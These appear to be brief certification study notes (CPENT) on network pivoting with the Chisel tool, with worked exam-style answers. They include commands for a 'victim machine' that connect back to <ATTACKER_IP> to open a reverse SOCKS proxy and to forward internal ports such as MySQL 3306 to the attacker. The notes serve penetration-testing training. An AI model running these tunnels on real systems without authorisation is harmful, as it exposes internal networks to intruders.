# CPENT

Port Forwarding:
Chisel:
Attacker listener:
chisel server --port 8080 --reverse &

Victim machine:
chisel client <ATTACKER_IP>:8080 R:socks &

chisel client <ATTACKER_IP>:8080 R:9000:127.0.0.1:80

EX: How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.

Attacker — 172.16.0.200
chisel server --port 1337 --reverse &

Client
On the machine running the Chisel client:

chisel client 172.16.0.200:1337 R:33060:172.16.0.100:3306 &

If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?
./chisel client 172.16.0.5:4444 8000:172.16.0.10:80


